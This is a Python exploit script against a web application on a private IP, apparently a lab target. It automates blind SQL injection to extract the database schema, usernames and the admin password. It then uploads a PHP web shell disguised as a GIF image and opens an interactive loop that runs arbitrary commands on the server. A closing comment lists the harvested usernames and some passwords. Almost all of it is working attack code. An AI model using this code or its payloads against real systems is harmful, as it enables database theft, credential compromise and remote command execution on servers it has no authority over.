import requests
from bs4 import BeautifulSoup
import re

atz = "abcdefghijklmnopqrtuvwxyz1234567890._-!".lower()

url = "http://192.168.1.131/"

proxy = {
    "http" : "127.0.0.1:8080"
}

# requests.get(url,proxies=proxy)

# print(requests.get(f"{url}?id=1' and select (ascii(left(database(),1)))<99-- -",proxies=proxy).status_code)
# print(requests.get(f"{url}?id=15' or substr(database(),1,1) = 's' -- -",proxies=proxy).status_code)

# print(requests.get(f"{url}?id=15' or substr((select TaBle_nAmE FrOm InForMAtion_ScHemA.TaBleS wHeRe tAbLe_SchEMa=database()),1,1) > 'a' -- -",proxies=proxy).status_code)

# print(requests.get(f"{url}?id=15' or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) > 'z' -- -",proxies=proxy).status_code)


# print(requests.get(f"{url}?id=15' or substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1),1,1) > 'z' -- -",proxies=proxy).status_code)


# print(requests.get(f"{url}?id=16' or substr((select username from users limit 0,1),1,1); -- -",proxies=proxy).status_code)

# print(requests.get(f"{url}?id=16' or substr((select password from users where username='admin' limit 0,1),1,1); -- -",proxies=proxy).status_code)







# remote_address = input("Enter the target website IP Address : ")
# local_address = input("Enter the Local IP Address : ")








def search_db_name():
    db_name = ""


    for j in range(20):
        for i in atz:
            res = requests.get(f"{url}?id=15' or substr(database(),{j},1) = '{i}' -- -",proxies=proxy)

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                db_name += i
                print(db_name)
            else:
                continue   
    return db_name

# db_name = search_db_name()


def search_tb_name():
    tb_name = ""


    for j in range(20):
        for i in atz:
            res = requests.get(f"{url}?id=15' || substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),{j},1) = '{i}' -- -",proxies=proxy)

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                tb_name += i
                print(tb_name)
            else:
                continue 
    return tb_name

# search_tb_name()


def search_column_name():
    col_name = ""

    for j in range(20):
        for i in atz:
            res = requests.get(f"{url}?id=15' or substr((select column_name from information_schema.columns where table_schema=database() limit 11,1),{j},1) = '{i}' -- -",proxies=proxy)

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                col_name += i
                print(col_name)
            else:
                continue


# search_tb_name()


def search_username():
    username = ""

    for j in range(200):
        for i in atz:
            res = requests.get(f"{url}?id=15' or substr((select username from users limit 10,1),{j},1) = '{i}'; -- -",proxies=proxy)

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                username += i
                print(username)
            else:
                continue



def search_password():
    password = ""

    for j in range(200):
        for i in atz:
            res = requests.get(f"{url}?id=15' or substr((select password from users where username='admin'),{j},1) = '{i}'; -- -",proxies=proxy)

            soup = str(BeautifulSoup(res.content, "html.parser"))

            reSearch = re.search("You are on the way.....", soup)

            if reSearch:
                password += i
                print(password)
            else:
                continue


def file_upload():

    rurl = f"{url}bkr.php"

    req = requests.Session()

    #get request to the main page to get cookie
    req.get(f"{url}aijqy.php")


    header = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language" : "en-US,en;q=0.5",
        "Accept-Encoding" : "gzip, deflate",
        "Content-Type" : "multipart/form-data; boundary=---------------------------33532551339340547022169488129",
        
    }

    data = """-----------------------------33532551339340547022169488129\r\nContent-Disposition: form-data; name="uploadedFile"; filename="1kb-min.php"\r\nContent-Type: image/gif\r\n\r\nGIF89a\r\n<!DOCTYPE html><body><div><pre class="command"><?php  system($_GET['cmd']); ?></pre></div></body></html>\r\n-----------------------------33532551339340547022169488129\r\nContent-Disposition: form-data; name="uploadBtn"\r\n\r\n\r\n-----------------------------33532551339340547022169488129--"""


    #upload the file
    res = req.post(rurl,proxies=proxy,data=data,headers=header)
    
    file_name = re.findall(r'[a-z0-9A-Z]*\.php',res.text)[0]

    return file_name, req




file_name,req = file_upload()


def get_shell(file_name, req, input_command):

    

    res = req.get(f"{url}uploads/{file_name}?cmd={input_command}",proxies=proxy)

    soup = BeautifulSoup(res.text, "html.parser")


    print(soup.find("pre", class_="command").text)


while(True):
    input_command = input("Enter the command : ")
    get_shell(file_name,req, input_command)










"""

email_id - 1
id - 2
referer - 3
ip_address - 4
id - 5
uagent - 6
ipaddress - 7
username - 8
id -9
username - 10
password - 11



tables ---

users - 3


users ----

dump - 1
angelina - 2
dummy - 3
secure
stupid 	
superman - geniou
batman
admin - aijqy.php
admin1 - admin1
admin2 - admin2


"""